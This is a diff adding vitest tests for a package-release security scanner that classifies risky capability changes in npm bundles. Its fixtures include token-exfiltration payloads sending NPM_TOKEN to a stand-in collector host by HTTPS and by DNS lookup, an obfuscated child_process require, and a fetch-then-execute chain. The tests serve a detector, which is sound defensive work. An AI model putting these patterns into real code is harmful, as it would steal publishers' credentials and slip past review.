@@ -1,3 +1,4 @@
+import { createHash } from "node:crypto";
 import { describe, expect, test } from "vitest";
 import {
   annotateFindingsWithDiffStatus,
@@ -7,6 +8,7 @@ import {
   projectReleaseRuleFindings,
 } from "../server/lib/review";
 import { changedStagedLines } from "../server/lib/review/rules/context";
+import { computeScanRiskBreakdown } from "../server/lib/review/risk";
 
 describe("changed staged line numbers", () => {
   test.each([
@@ -451,5 +453,149 @@ describe("code.remote-shell release-delta classification", () => {
     // patterns also match the added line.
     expect(remoteShell.releaseDelta).toBe(true);
     expect(computeRisk(annotated.filter((finding) => finding.releaseDelta))).toBe("high");
+  });
+});
+
+describe("release delta in minified and grown modules", () => {
+  const AI_OFF = {
+    status: "unavailable",
+    risk: "low",
+    releaseAssessment: "not_assessed",
+    summary: "",
+    findings: [],
+    requiresManualReview: false,
+    model: null,
+    reviewerVersion: null,
+  };
+  // The digest must cover the whole text, or an edited file reads as unchanged.
+  const file = (path, textSample) => ({
+    path,
+    size: textSample.length,
+    sha256: createHash("sha256").update(textSample).digest("hex"),
+    flags: [],
+    textSample,
+  });
+  const release = (previous, staged) => {
+    const previousFiles = Object.entries(previous).map(([path, text]) => file(path, text));
+    const stagedFiles = Object.entries(staged).map(([path, text]) => file(path, text));
+    const diff = createPackageDiff(previousFiles, stagedFiles);
+    const findings = deterministicFindings(stagedFiles, diff, null, { previousFiles });
+    const annotated = annotateFindingsWithDiffStatus(findings, diff, {
+      previousFiles,
+      stagedFiles,
+    });
+    return { annotated, risk: computeScanRiskBreakdown(annotated, AI_OFF) };
+  };
+  // The version string sits far more than the match margin from any capability.
+  const bundle = (version, tail = "") =>
+    `function g(){return fetch("https://api.example.org/v1")};var e=process.env.SERVICE_KEY;var q=${"0".repeat(3000)};var v="${version}";${"1".repeat(3000)}${tail}\n`;
+
+  test("a version-string edit in a minified bundle leaves its capabilities as package context", () => {
+    const { annotated, risk } = release(
+      { "dist/index.js": bundle("4.26.1") },
+      { "dist/index.js": bundle("4.26.2") },
+    );
+
+    expect(annotated.find((finding) => finding.ruleId === "code.network-access")).toMatchObject({
+      diffStatus: "modified",
+      releaseDelta: false,
+    });
+    expect(annotated.filter((finding) => finding.releaseDelta)).toEqual([]);
+    expect(risk.releaseRisk).toBe("low");
+  });
+
+  test("a payload appended to a minified bundle is on the release delta", () => {
+    const payload =
+      ';require("https").get("https://collector.example.invalid/?t="+process.env.NPM_TOKEN)';
+    const { risk } = release(
+      { "dist/index.js": bundle("1.0.0") },
+      { "dist/index.js": bundle("1.0.0", payload) },
+    );
+
+    expect(risk.releaseRisk).toBe("high");
+  });
+
+  test("more spawns in a module that already spawns are an expanded capability", () => {
+    const previous = "const { execSync } = require('child_process');\nexecSync('npm --version');\n";
+    const staged = `${previous}execSync('pnpm --version');\nexecSync('yarn --version');\n`;
+    const { annotated } = release({ "index.js": previous }, { "index.js": staged });
+
+    expect(annotated.find((finding) => finding.ruleId === "code.process-execution")).toMatchObject({
+      releaseDelta: true,
+      releaseDeltaKind: "expanded",
+    });
+  });
+
+  test.each([
+    [
+      "a host the baseline never named",
+      "fetch('https://api.example.org/a');\n",
+      "fetch('https://api.example.org/a');\nfetch('https://collector.example.invalid/b');\n",
+      "code.network-access",
+    ],
+    [
+      "a bare hostname in request options",
+      "require('https').get('https://api.example.org/a');\n",
+      "require('https').get('https://api.example.org/a');\nrequire('https').request({ hostname: 'collector.example.invalid' });\n",
+      "code.network-access",
+    ],
+    [
+      "a change that only matches once assembled, appended",
+      "require('child_process').execSync('git status');\n",
+      "require('child_process').execSync('git status');\nglobalThis['re' + 'quire'](['chi', 'ld_pro', 'cess'].join('')).execSync(cmd);\n",
+      "code.process-execution",
+    ],
+    [
+      "a change that only matches once assembled, prepended",
+      "require('child_process').execSync('git status');\n",
+      "globalThis['re' + 'quire'](['chi', 'ld_pro', 'cess'].join('')).execSync(cmd);\nrequire('child_process').execSync('git status');\n",
+      "code.process-execution",
+    ],
+    [
+      "one more eval site",
+      "const add = new Function('a', 'return a + 1');\n",
+      "const add = new Function('a', 'return a + 1');\nnew Function(fetched)();\n",
+      "code.dynamic-evaluation",
+    ],
+    [
+      "one more credential read",
+      "const home = process.env.SERVICE_KEY;\n",
+      "const home = process.env.SERVICE_KEY;\nconst token = process.env.NPM_TOKEN;\n",
+      "code.credential-access",
+    ],
+  ])("keeps full scoring for %s", (_name, previous, staged, ruleId) => {
+    const { annotated } = release({ "index.js": previous }, { "index.js": staged });
+    const finding = annotated.find((candidate) => candidate.ruleId === ruleId);
+
+    expect(finding).toMatchObject({ releaseDelta: true });
+    expect(finding.releaseDeltaKind).toBeUndefined();
+  });
+
+  test("a payload split across two modules that each already had their half stays high", () => {
+    const { risk } = release(
+      {
+        "lib/http.js":
+          "module.exports = (u) => fetch('https://github.com/org/repo/releases/latest');\n",
+        "lib/cli.js":
+          "const { execFileSync } = require('child_process');\nexecFileSync('git', ['status']);\n",
+      },
+      {
+        "lib/http.js":
+          "module.exports = (u) => fetch('https://github.com/org/repo/releases/latest');\nfetch('https://github.com/org/repo/raw/x').then((r) => r.text()).then(save);\n",
+        "lib/cli.js":
+          "const { execFileSync } = require('child_process');\nexecFileSync('git', ['status']);\nexecFileSync(tmpPath);\n",
+      },
+    );
+
+    expect(risk.releaseRisk).toBe("high");
+  });
+
+  test("a credential sent through a spawn's arguments stays high", () => {
+    const previous =
+      "const { execFileSync } = require('child_process');\nconst gh = process.env.GITHUB_TOKEN;\nexecFileSync('git', ['status']);\n";
+    const staged = `${previous}execFileSync('nslookup', [Buffer.from(process.env.NPM_TOKEN).toString('hex') + '.x.example.invalid']);\n`;
+    const { risk } = release({ "lib/release.js": previous }, { "lib/release.js": staged });
+
+    expect(risk.releaseRisk).toBe("high");
   });
 });
